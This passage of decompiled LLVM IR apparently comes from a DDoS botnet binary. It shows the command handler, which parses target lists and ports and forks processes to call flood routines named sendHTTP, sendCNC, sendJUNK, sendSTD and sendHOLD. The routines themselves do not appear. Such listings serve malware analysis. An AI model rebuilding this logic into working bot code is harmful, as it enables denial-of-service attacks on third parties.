  %v2_8050940 = load i32, i32* %v1_8050940, align 4
  %v2_8050945 = call i32 @atol(i32 %v2_8050940)
  store i32 %v2_8050945, i32* @esi, align 4
  %v1_805094f = add i32 %tmp217, 16
  %v1_8050952 = inttoptr i32 %v1_805094f to i32*
  %v2_8050952 = load i32, i32* %v1_8050952, align 4
  store i32 %v2_8050952, i32* @edi, align 4
  %v1_8050959 = add i32 %tmp217, 12
  %v5_8050959 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050959, i1* %cf.global-to-local, align 1
  %v1_805095c = inttoptr i32 %v1_8050959 to i32*
  %v2_805095c = load i32, i32* %v1_805095c, align 4
  %v2_8050961 = call i32 @atol(i32 %v2_805095c)
  %v1_8050966 = urem i32 %v2_8050961, 65536
  store i32 %v1_8050966, i32* %edx.global-to-local, align 4
  %v1_805096e = add i32 %tmp217, 8
  %v1_8050971 = inttoptr i32 %v1_805096e to i32*
  %v2_8050971 = load i32, i32* %v1_8050971, align 4
  store i1 %v5_8050832, i1* %cf.global-to-local, align 1
  %v2_805097b = load i32, i32* %v1_8050835, align 4
  %v0_805097d = load i32, i32* @ebx, align 4
  %v0_8050981 = load i32, i32* @esi, align 4
  %v0_8050985 = load i32, i32* @edi, align 4
  %v7_8050994 = trunc i32 %v2_8050961 to i16
  %v8_8050994 = call i32 @sendHTTP(i32 %v2_805097b, i32 %v2_8050971, i16 %v7_8050994, i32 %v0_8050985, i32 %v0_8050981, i32 %v0_805097d)
  %v2_80509a0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80509a5:                             ; preds = %dec_label_pc_80508f5, %dec_label_pc_805084f, %dec_label_pc_80507da
  %v2_80509a8 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80509c5 = inttoptr i32 %v2_80509a8 to i8*
  store i32 %v2_80509a8, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d3d5.885 to i32), i32* @edi, align 4
  %v7_80509d7 = call i32 @_strncmp(i8* %v4_80509c5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d3d5.885, i32 0, i32 0), i32 4)
  %v8_80509d7 = urem i32 %v7_80509d7, 2
  %v9_80509d7 = icmp eq i32 %v8_80509d7, 0
  %v0_80509d9 = load i1, i1* %cf.global-to-local, align 1
  %v2_80509d9 = or i1 %v0_80509d9, %v9_80509d7
  %v3_80509d9 = zext i1 %v2_80509d9 to i32
  %v4_80509d9 = load i32, i32* @edx, align 4
  %v5_80509d9 = and i32 %v4_80509d9, -256
  %v6_80509d9 = or i32 %v3_80509d9, %v5_80509d9
  %v7_80509d9 = xor i32 %v6_80509d9, 1
  store i32 %v7_80509d9, i32* @edx, align 4
  %v1_80509e1 = trunc i32 %v7_80509d9 to i8
  %v3_80509e1 = zext i1 %v0_80509d9 to i8
  %v4_80509e1 = sub nsw i8 %v1_80509e1, %v3_80509e1
  %v15_80509e1 = icmp eq i8 %v4_80509e1, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80509ea = icmp eq i1 %v15_80509e1, false
  br i1 %v1_80509ea, label %dec_label_pc_8050b17, label %dec_label_pc_80509f0

dec_label_pc_80509f0:                             ; preds = %dec_label_pc_80509a5
  %v2_80509e5 = sext i8 %v4_80509e1 to i32
  %v9_80509f0 = icmp ult i32 %arg1, 3
  store i1 %v9_80509f0, i1* %cf.global-to-local, align 1
  %v7_80509f4 = icmp sgt i32 %arg1, 3
  br i1 %v7_80509f4, label %dec_label_pc_80509fa, label %dec_label_pc_8051252

dec_label_pc_80509fa:                             ; preds = %dec_label_pc_80509f0
  %v1_80509fd = add i32 %tmp217, 8
  %v5_80509fd = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_80509fd, i1* %cf.global-to-local, align 1
  %v1_8050a00 = inttoptr i32 %v1_80509fd to i32*
  %v2_8050a00 = load i32, i32* %v1_8050a00, align 4
  %v2_8050a05 = call i32 @atol(i32 %v2_8050a00)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp232 = icmp slt i32 %v2_8050a05, 1
  br i1 %tmp232, label %dec_label_pc_8051252, label %dec_label_pc_8050a12

dec_label_pc_8050a12:                             ; preds = %dec_label_pc_80509fa
  %v1_8050a15 = add i32 %tmp217, 12
  %v5_8050a15 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050a15, i1* %cf.global-to-local, align 1
  %v1_8050a18 = inttoptr i32 %v1_8050a15 to i32*
  %v2_8050a18 = load i32, i32* %v1_8050a18, align 4
  %v2_8050a1d = call i32 @atol(i32 %v2_8050a18)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp233 = icmp slt i32 %v2_8050a1d, 1
  %tmp234 = icmp eq i1 %tmp233, false
  br i1 %tmp234, label %dec_label_pc_8050a2b, label %dec_label_pc_8051252

dec_label_pc_8050a2b:                             ; preds = %dec_label_pc_8050a12
  %v1_8050a2e = add i32 %tmp217, 4
  %v1_8050a31 = inttoptr i32 %v1_8050a2e to i32*
  %v2_8050a31 = load i32, i32* %v1_8050a31, align 4
  store i1 %v5_80509fd, i1* %cf.global-to-local, align 1
  %v2_8050a3c = load i32, i32* %v1_8050a00, align 4
  %v2_8050a41 = call i32 @atol(i32 %v2_8050a3c)
  store i1 %v5_8050a15, i1* %cf.global-to-local, align 1
  %v2_8050a4f = load i32, i32* %v1_8050a18, align 4
  %v2_8050a54 = call i32 @atol(i32 %v2_8050a4f)
  %v4_8050a67 = inttoptr i32 %v2_8050a31 to i8*
  %v4_8050a6a = call i32 @__GI_strchr(i8* %v4_8050a67, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a6f = icmp eq i32 %v4_8050a6a, 0
  br i1 %v1_8050a6f, label %dec_label_pc_8050ae5, label %dec_label_pc_8050a73

dec_label_pc_8050a73:                             ; preds = %dec_label_pc_8050a2b
  store i32 %v2_8050a31, i32* @eax, align 4
  %v3_8050a81 = call i32 @__GI_strtok(i32 %v2_8050a31, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050add54 = icmp eq i32 %v3_8050a81, 0
  %v1_8050ae161 = icmp eq i1 %v4_8050add54, false
  br i1 %v1_8050ae161, label %dec_label_pc_8050a8b, label %dec_label_pc_8050b17

dec_label_pc_8050a8b:                             ; preds = %dec_label_pc_8050a73, %dec_label_pc_8050ac6
  %storemerge1662 = phi i32 [ %v3_8050ad5, %dec_label_pc_8050ac6 ], [ %v3_8050a81, %dec_label_pc_8050a73 ]
  %v0_8050a8b = call i32 @listFork()
  store i32 %v0_8050a8b, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a90 = icmp eq i32 %v0_8050a8b, 0
  %v1_8050a92 = icmp eq i1 %v1_8050a90, false
  br i1 %v1_8050a92, label %dec_label_pc_8050ac6, label %dec_label_pc_8050a94

dec_label_pc_8050a94:                             ; preds = %dec_label_pc_8050a8b
  %v4_8050aa8 = call i32 @sendCNC(i32 %storemerge1662, i32 %v2_8050a41, i32 %v2_8050a54)
  %v0_8050aad = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8050aad = ptrtoint i8* %v0_8050aad to i32
  %v2_8050ab5 = call i32 @__libc_close(i32 %v1_8050aad)
  %v2_8050ac1 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050ac6:                             ; preds = %dec_label_pc_8050a8b
  %v3_8050ad5 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050add = icmp eq i32 %v3_8050ad5, 0
  %v1_8050ae1 = icmp eq i1 %v4_8050add, false
  br i1 %v1_8050ae1, label %dec_label_pc_8050a8b, label %dec_label_pc_8050b17

dec_label_pc_8050ae5:                             ; preds = %dec_label_pc_8050a2b
  %v0_8050ae5 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050aea = icmp eq i32 %v0_8050ae5, 0
  %v1_8050aec = icmp eq i1 %v1_8050aea, false
  br i1 %v1_8050aec, label %dec_label_pc_8051252, label %dec_label_pc_8050af2

dec_label_pc_8050af2:                             ; preds = %dec_label_pc_8050ae5
  %v4_8050b06 = call i32 @sendCNC(i32 %v2_8050a31, i32 %v2_8050a41, i32 %v2_8050a54)
  %v2_8050b12 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050b17:                             ; preds = %dec_label_pc_8050ac6, %dec_label_pc_8050a73, %dec_label_pc_80509a5
  %v2_8050b1a = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050b37 = inttoptr i32 %v2_8050b1a to i8*
  store i32 %v2_8050b1a, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805d3d9.886 to i32), i32* @edi, align 4
  %v7_8050b49 = call i32 @_strncmp(i8* %v4_8050b37, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805d3d9.886, i32 0, i32 0), i32 6)
  %v8_8050b49 = urem i32 %v7_8050b49, 2
  %v9_8050b49 = icmp eq i32 %v8_8050b49, 0
  %v0_8050b4b = load i1, i1* %cf.global-to-local, align 1
  %v2_8050b4b = or i1 %v0_8050b4b, %v9_8050b49
  %v3_8050b4b = zext i1 %v2_8050b4b to i32
  %v4_8050b4b = load i32, i32* @edx, align 4
  %v5_8050b4b = and i32 %v4_8050b4b, -256
  %v6_8050b4b = or i32 %v3_8050b4b, %v5_8050b4b
  %v7_8050b4b = xor i32 %v6_8050b4b, 1
  store i32 %v7_8050b4b, i32* @edx, align 4
  %v1_8050b53 = trunc i32 %v7_8050b4b to i8
  %v3_8050b53 = zext i1 %v0_8050b4b to i8
  %v4_8050b53 = sub nsw i8 %v1_8050b53, %v3_8050b53
  %v15_8050b53 = icmp eq i8 %v4_8050b53, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050b5c = icmp eq i1 %v15_8050b53, false
  br i1 %v1_8050b5c, label %dec_label_pc_8050cf8, label %dec_label_pc_8050b62

dec_label_pc_8050b62:                             ; preds = %dec_label_pc_8050b17
  %v2_8050b57 = sext i8 %v4_8050b53 to i32
  %v9_8050b62 = icmp ult i32 %arg1, 3
  store i1 %v9_8050b62, i1* %cf.global-to-local, align 1
  %v7_8050b66 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050b66, label %dec_label_pc_8050b6c, label %dec_label_pc_8051252

dec_label_pc_8050b6c:                             ; preds = %dec_label_pc_8050b62
  %v1_8050b6f = add i32 %tmp217, 8
  %v5_8050b6f = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050b6f, i1* %cf.global-to-local, align 1
  %v1_8050b72 = inttoptr i32 %v1_8050b6f to i32*
  %v2_8050b72 = load i32, i32* %v1_8050b72, align 4
  %v2_8050b77 = call i32 @atol(i32 %v2_8050b72)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp235 = icmp slt i32 %v2_8050b77, 1
  br i1 %tmp235, label %dec_label_pc_8051252, label %dec_label_pc_8050b84

dec_label_pc_8050b84:                             ; preds = %dec_label_pc_8050b6c
  %v1_8050b87 = add i32 %tmp217, 12
  %v5_8050b87 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050b87, i1* %cf.global-to-local, align 1
  %v1_8050b8a = inttoptr i32 %v1_8050b87 to i32*
  %v2_8050b8a = load i32, i32* %v1_8050b8a, align 4
  %v2_8050b8f = call i32 @atol(i32 %v2_8050b8a)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp236 = icmp slt i32 %v2_8050b8f, 1
  %tmp237 = icmp eq i1 %tmp236, false
  br i1 %tmp237, label %dec_label_pc_8050b9d, label %dec_label_pc_8051252

dec_label_pc_8050b9d:                             ; preds = %dec_label_pc_8050b84
  %v1_8050ba0 = add i32 %tmp217, 4
  %v1_8050ba3 = inttoptr i32 %v1_8050ba0 to i32*
  %v2_8050ba3 = load i32, i32* %v1_8050ba3, align 4
  store i1 %v5_8050b6f, i1* %cf.global-to-local, align 1
  %v2_8050bae = load i32, i32* %v1_8050b72, align 4
  %v2_8050bb3 = call i32 @atol(i32 %v2_8050bae)
  store i1 %v5_8050b87, i1* %cf.global-to-local, align 1
  %v2_8050bc1 = load i32, i32* %v1_8050b8a, align 4
  %v2_8050bc6 = call i32 @atol(i32 %v2_8050bc1)
  %v4_8050bd9 = inttoptr i32 %v2_8050ba3 to i8*
  %v4_8050bdc = call i32 @__GI_strchr(i8* %v4_8050bd9, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050be1 = icmp eq i32 %v4_8050bdc, 0
  br i1 %v1_8050be1, label %dec_label_pc_8050c94, label %dec_label_pc_8050be9

dec_label_pc_8050be9:                             ; preds = %dec_label_pc_8050b9d
  store i32 %v2_8050ba3, i32* @eax, align 4
  %v3_8050bf7 = call i32 @__GI_strtok(i32 %v2_8050ba3, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050c8845 = icmp eq i32 %v3_8050bf7, 0
  %v1_8050c8c52 = icmp eq i1 %v4_8050c8845, false
  br i1 %v1_8050c8c52, label %dec_label_pc_8050c04, label %dec_label_pc_8050cf8

dec_label_pc_8050c04:                             ; preds = %dec_label_pc_8050be9, %dec_label_pc_8050c71
  %storemerge1753 = phi i32 [ %v3_8050c80, %dec_label_pc_8050c71 ], [ %v3_8050bf7, %dec_label_pc_8050be9 ]
  %v0_8050c04 = call i32 @listFork()
  store i32 %v0_8050c04, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050c09 = icmp eq i32 %v0_8050c04, 0
  %v1_8050c0b = icmp eq i1 %v1_8050c09, false
  br i1 %v1_8050c0b, label %dec_label_pc_8050c71, label %dec_label_pc_8050c0d

dec_label_pc_8050c0d:                             ; preds = %dec_label_pc_8050c04
  %v4_8050c21 = call i32 @sendJUNK(i32 %storemerge1753, i32 %v2_8050bb3, i32 %v2_8050bc6)
  %v4_8050c3a = call i32 @sendSTD(i32 %storemerge1753, i32 %v2_8050bb3, i32 %v2_8050bc6)
  %v4_8050c53 = call i32 @sendHOLD(i32 %storemerge1753, i32 %v2_8050bb3, i32 %v2_8050bc6)
  %v0_8050c58 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8050c58 = ptrtoint i8* %v0_8050c58 to i32
  %v2_8050c60 = call i32 @__libc_close(i32 %v1_8050c58)
  %v2_8050c6c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050c71:                             ; preds = %dec_label_pc_8050c04
  %v3_8050c80 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050c88 = icmp eq i32 %v3_8050c80, 0
  %v1_8050c8c = icmp eq i1 %v4_8050c88, false
  br i1 %v1_8050c8c, label %dec_label_pc_8050c04, label %dec_label_pc_8050cf8

dec_label_pc_8050c94:                             ; preds = %dec_label_pc_8050b9d
  %v0_8050c94 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050c99 = icmp eq i32 %v0_8050c94, 0
  %v1_8050c9b = icmp eq i1 %v1_8050c99, false
  br i1 %v1_8050c9b, label %dec_label_pc_8051252, label %dec_label_pc_8050ca1

dec_label_pc_8050ca1:                             ; preds = %dec_label_pc_8050c94
  %v4_8050cb5 = call i32 @sendJUNK(i32 %v2_8050ba3, i32 %v2_8050bb3, i32 %v2_8050bc6)
  %v4_8050cce = call i32 @sendSTD(i32 %v2_8050ba3, i32 %v2_8050bb3, i32 %v2_8050bc6)
  %v4_8050ce7 = call i32 @sendHOLD(i32 %v2_8050ba3, i32 %v2_8050bb3, i32 %v2_8050bc6)
  %v2_8050cf3 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050cf8:                             ; preds = %dec_label_pc_8050c71, %dec_label_pc_8050be9, %dec_label_pc_8050b17
  %v2_8050cfb = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050d18 = inttoptr i32 %v2_8050cfb to i8*
  store i32 %v2_8050cfb, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805d3df.887 to i32), i32* @edi, align 4
  %v7_8050d2a = call i32 @_strncmp(i8* %v4_8050d18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d3df.887, i32 0, i32 0), i32 4)
  %v8_8050d2a = urem i32 %v7_8050d2a, 2
  %v9_8050d2a = icmp eq i32 %v8_8050d2a, 0
  %v0_8050d2c = load i1, i1* %cf.global-to-local, align 1
  %v2_8050d2c = or i1 %v0_8050d2c, %v9_8050d2a
  %v3_8050d2c = zext i1 %v2_8050d2c to i32
  %v4_8050d2c = load i32, i32* @edx, align 4
  %v5_8050d2c = and i32 %v4_8050d2c, -256
  %v6_8050d2c = or i32 %v3_8050d2c, %v5_8050d2c
  %v7_8050d2c = xor i32 %v6_8050d2c, 1
  store i32 %v7_8050d2c, i32* @edx, align 4
  %v1_8050d34 = trunc i32 %v7_8050d2c to i8
  %v3_8050d34 = zext i1 %v0_8050d2c to i8
  %v4_8050d34 = sub nsw i8 %v1_8050d34, %v3_8050d34
  %v15_8050d34 = icmp eq i8 %v4_8050d34, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050d3d = icmp eq i1 %v15_8050d34, false
  br i1 %v1_8050d3d, label %dec_label_pc_8050e5d, label %dec_label_pc_8050d43

dec_label_pc_8050d43:                             ; preds = %dec_label_pc_8050cf8
  %v2_8050d38 = sext i8 %v4_8050d34 to i32
  %v9_8050d43 = icmp ult i32 %arg1, 3
  store i1 %v9_8050d43, i1* %cf.global-to-local, align 1
  %v7_8050d47 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050d47, label %dec_label_pc_8050d4d, label %dec_label_pc_8051252

dec_label_pc_8050d4d:                             ; preds = %dec_label_pc_8050d43
  %v1_8050d50 = add i32 %tmp217, 8
  %v5_8050d50 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050d50, i1* %cf.global-to-local, align 1
  %v1_8050d53 = inttoptr i32 %v1_8050d50 to i32*
  %v2_8050d53 = load i32, i32* %v1_8050d53, align 4
  %v2_8050d58 = call i32 @atol(i32 %v2_8050d53)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp238 = icmp slt i32 %v2_8050d58, 1
  br i1 %tmp238, label %dec_label_pc_8051252, label %dec_label_pc_8050d65

dec_label_pc_8050d65:                             ; preds = %dec_label_pc_8050d4d
  %v1_8050d68 = add i32 %tmp217, 12
  %v5_8050d68 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050d68, i1* %cf.global-to-local, align 1
  %v1_8050d6b = inttoptr i32 %v1_8050d68 to i32*
  %v2_8050d6b = load i32, i32* %v1_8050d6b, align 4
  %v2_8050d70 = call i32 @atol(i32 %v2_8050d6b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_8050d70, 1
  %tmp240 = icmp eq i1 %tmp239, false
  br i1 %tmp240, label %dec_label_pc_8050d7e, label %dec_label_pc_8051252

dec_label_pc_8050d7e:                             ; preds = %dec_label_pc_8050d65
  %v1_8050d81 = add i32 %tmp217, 4
  %v1_8050d84 = inttoptr i32 %v1_8050d81 to i32*
  %v2_8050d84 = load i32, i32* %v1_8050d84, align 4
  store i1 %v5_8050d50, i1* %cf.global-to-local, align 1
  %v2_8050d8f = load i32, i32* %v1_8050d53, align 4
  %v2_8050d94 = call i32 @atol(i32 %v2_8050d8f)
  store i1 %v5_8050d68, i1* %cf.global-to-local, align 1
  %v2_8050da2 = load i32, i32* %v1_8050d6b, align 4
  %v2_8050da7 = call i32 @atol(i32 %v2_8050da2)
  %v4_8050dba = inttoptr i32 %v2_8050d84 to i8*
  %v4_8050dbd = call i32 @__GI_strchr(i8* %v4_8050dba, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050dc2 = icmp eq i32 %v4_8050dbd, 0
  br i1 %v1_8050dc2, label %dec_label_pc_8050e2b, label %dec_label_pc_8050dc6

dec_label_pc_8050dc6:                             ; preds = %dec_label_pc_8050d7e
  store i32 %v2_8050d84, i32* @eax, align 4
  %v3_8050dd4 = call i32 @__GI_strtok(i32 %v2_8050d84, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050e2336 = icmp eq i32 %v3_8050dd4, 0
  %v1_8050e2743 = icmp eq i1 %v4_8050e2336, false
  br i1 %v1_8050e2743, label %dec_label_pc_8050dde, label %dec_label_pc_8050e5d

dec_label_pc_8050dde:                             ; preds = %dec_label_pc_8050dc6, %dec_label_pc_8050e0c
  %storemerge1844 = phi i32 [ %v3_8050e1b, %dec_label_pc_8050e0c ], [ %v3_8050dd4, %dec_label_pc_8050dc6 ]
  %v0_8050dde = call i32 @listFork()
  store i32 %v0_8050dde, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050de3 = icmp eq i32 %v0_8050dde, 0
  %v1_8050de5 = icmp eq i1 %v1_8050de3, false
  br i1 %v1_8050de5, label %dec_label_pc_8050e0c, label %dec_label_pc_8050de7

dec_label_pc_8050de7:                             ; preds = %dec_label_pc_8050dde
  %v4_8050dfb = call i32 @sendSTD(i32 %storemerge1844, i32 %v2_8050d94, i32 %v2_8050da7)
  %v2_8050e07 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050e0c:                             ; preds = %dec_label_pc_8050dde
  %v3_8050e1b = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805d311.859 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050e23 = icmp eq i32 %v3_8050e1b, 0
  %v1_8050e27 = icmp eq i1 %v4_8050e23, false
  br i1 %v1_8050e27, label %dec_label_pc_8050dde, label %dec_label_pc_8050e5d

dec_label_pc_8050e2b:                             ; preds = %dec_label_pc_8050d7e
  %v0_8050e2b = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050e30 = icmp eq i32 %v0_8050e2b, 0
  %v1_8050e32 = icmp eq i1 %v1_8050e30, false
  br i1 %v1_8050e32, label %dec_label_pc_8051252, label %dec_label_pc_8050e38

dec_label_pc_8050e38:                             ; preds = %dec_label_pc_8050e2b
  %v4_8050e4c = call i32 @sendSTD(i32 %v2_8050d84, i32 %v2_8050d94, i32 %v2_8050da7)
  %v2_8050e58 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050e5d:                             ; preds = %dec_label_pc_8050e0c, %dec_label_pc_8050dc6, %dec_label_pc_8050cf8
  %v2_8050e60 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050e7d = inttoptr i32 %v2_8050e60 to i8*
  %v7_8050e8f = call i32 @_strncmp(i8* %v4_8050e7d, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d3e3.888, i32 0, i32 0), i32 4)
  %v8_8050e8f = urem i32 %v7_8050e8f, 2
  %v9_8050e8f = icmp eq i32 %v8_8050e8f, 0
  %v0_8050e91 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050e91 = or i1 %v0_8050e91, %v9_8050e8f
  %v3_8050e91 = zext i1 %v2_8050e91 to i32
  %v4_8050e91 = load i32, i32* @edx, align 4
  %v5_8050e91 = and i32 %v4_8050e91, -256
  %v6_8050e91 = or i32 %v3_8050e91, %v5_8050e91
  %v7_8050e91 = xor i32 %v6_8050e91, 1
  store i32 %v7_8050e91, i32* @edx, align 4
  %v1_8050e99 = trunc i32 %v7_8050e91 to i8
  %v3_8050e99 = zext i1 %v0_8050e91 to i8
  %v4_8050e99 = sub nsw i8 %v1_8050e99, %v3_8050e99
  %v15_8050e99 = icmp eq i8 %v4_8050e99, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050ea2 = icmp eq i1 %v15_8050e99, false
  br i1 %v1_8050ea2, label %dec_label_pc_80510ee, label %dec_label_pc_8050ea8

dec_label_pc_8050ea8:                             ; preds = %dec_label_pc_8050e5d
  %v2_8050e9d = sext i8 %v4_8050e99 to i32
  %v9_8050ea8 = icmp ult i32 %arg1, 5
  store i1 %v9_8050ea8, i1* %cf.global-to-local, align 1
  %v7_8050eac = icmp sgt i32 %arg1, 5
  br i1 %v7_8050eac, label %dec_label_pc_8050eb2, label %dec_label_pc_8051252

dec_label_pc_8050eb2:                             ; preds = %dec_label_pc_8050ea8
  %v1_8050eb5 = add i32 %tmp217, 12
  %v5_8050eb5 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050eb5, i1* %cf.global-to-local, align 1
  %v1_8050eb8 = inttoptr i32 %v1_8050eb5 to i32*
  %v2_8050eb8 = load i32, i32* %v1_8050eb8, align 4
  %v2_8050ebd = call i32 @atol(i32 %v2_8050eb8)
  %v5_8050ec2 = icmp ne i32 %v2_8050ebd, -1
  store i1 %v5_8050ec2, i1* %cf.global-to-local, align 1
  %v10_8050ec2 = icmp eq i32 %v2_8050ebd, -1
  br i1 %v10_8050ec2, label %dec_label_pc_8051252, label %dec_label_pc_8050ecb

dec_label_pc_8050ecb:                             ; preds = %dec_label_pc_8050eb2
  %v1_8050ece = add i32 %tmp217, 8
  %v5_8050ece = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050ece, i1* %cf.global-to-local, align 1
  %v1_8050ed1 = inttoptr i32 %v1_8050ece to i32*
  %v2_8050ed1 = load i32, i32* %v1_8050ed1, align 4
  %v2_8050ed6 = call i32 @atol(i32 %v2_8050ed1)
  %v5_8050edb = icmp ne i32 %v2_8050ed6, -1
  store i1 %v5_8050edb, i1* %cf.global-to-local, align 1
  %v10_8050edb = icmp eq i32 %v2_8050ed6, -1
  br i1 %v10_8050edb, label %dec_label_pc_8051252, label %dec_label_pc_8050ee4

dec_label_pc_8050ee4:                             ; preds = %dec_label_pc_8050ecb
  %v1_8050ee7 = add i32 %tmp217, 16
  %v2_8050ee7 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_8050ee7, i1* %cf.global-to-local, align 1
  %v1_8050eea = inttoptr i32 %v1_8050ee7 to i32*
  %v2_8050eea = load i32, i32* %v1_8050eea, align 4
  %v2_8050eef = call i32 @atol(i32 %v2_8050eea)
  %v5_8050ef4 = icmp ne i32 %v2_8050eef, -1
  store i1 %v5_8050ef4, i1* %cf.global-to-local, align 1
  %v10_8050ef4 = icmp eq i32 %v2_8050eef, -1
  br i1 %v10_8050ef4, label %dec_label_pc_8051252, label %dec_label_pc_8050efd

dec_label_pc_8050efd:                             ; preds = %dec_label_pc_8050ee4
  store i1 %v2_8050ee7, i1* %cf.global-to-local, align 1
  %v2_8050f03 = load i32, i32* %v1_8050eea, align 4
  %v2_8050f08 = call i32 @atol(i32 %v2_8050f03)
  %v1_8050f0d = add i32 %v2_8050f08, -32
  %v2_8050f0d = icmp ult i32 %v2_8050f08, 32
  %v3_8050f0d = sub i32 31, %v2_8050f08
  %v4_8050f0d = and i32 %v3_8050f0d, %v2_8050f08
  %v5_8050f0d = icmp slt i32 %v4_8050f0d, 0
  store i1 %v2_8050f0d, i1* %cf.global-to-local, align 1
  %v6_8050f0d = icmp eq i32 %v1_8050f0d, 0
  %v7_8050f0d = icmp slt i32 %v1_8050f0d, 0
  %v3_8050f10 = icmp eq i1 %v7_8050f0d, %v5_8050f0d
  %v4_8050f10 = icmp eq i1 %v6_8050f0d, false
  %v5_8050f10 = and i1 %v4_8050f10, %v3_8050f10
  br i1 %v5_8050f10, label %dec_label_pc_8051252, label %dec_label_pc_8050f16

dec_label_pc_8050f16:                             ; preds = %dec_label_pc_8050efd
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_8050f1a = icmp sgt i32 %arg1, 6
  br i1 %v7_8050f1a, label %dec_label_pc_8050f1c, label %dec_label_pc_8050f34

dec_label_pc_8050f1c:                             ; preds = %dec_label_pc_8050f16
  %v1_8050f1f = add i32 %tmp217, 24
  %v5_8050f1f = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_8050f1f, i1* %cf.global-to-local, align 1
  %v1_8050f22 = inttoptr i32 %v1_8050f1f to i32*
  %v2_8050f22 = load i32, i32* %v1_8050f22, align 4
  %v2_8050f27 = call i32 @atol(i32 %v2_8050f22)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_8050f2c = icmp slt i32 %v2_8050f27, 0
  br i1 %v2_8050f2c, label %dec_label_pc_8051252, label %dec_label_pc_8050f34

dec_label_pc_8050f34:                             ; preds = %dec_label_pc_8050f16, %dec_label_pc_8050f1c
  %v8_8050f34 = icmp ult i32 %arg1, 8
  store i1 %v8_8050f34, i1* %cf.global-to-local, align 1
  %v12_8050f34 = icmp eq i32 %arg1, 8
  %v1_8050f38 = icmp eq i1 %v12_8050f34, false
  br i1 %v1_8050f38, label %dec_label_pc_8050f53, label %dec_label_pc_8050f3a

dec_label_pc_8050f3a:                             ; preds = %dec_label_pc_8050f34
  %v1_8050f3d = add i32 %tmp217, 28
  %v5_8050f3d = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_8050f3d, i1* %cf.global-to-local, align 1
  %v1_8050f40 = inttoptr i32 %v1_8050f3d to i32*
  %v2_8050f40 = load i32, i32* %v1_8050f40, align 4
  %v2_8050f45 = call i32 @atol(i32 %v2_8050f40)
  store i1 false, i1* %cf.global-to-local, align 1
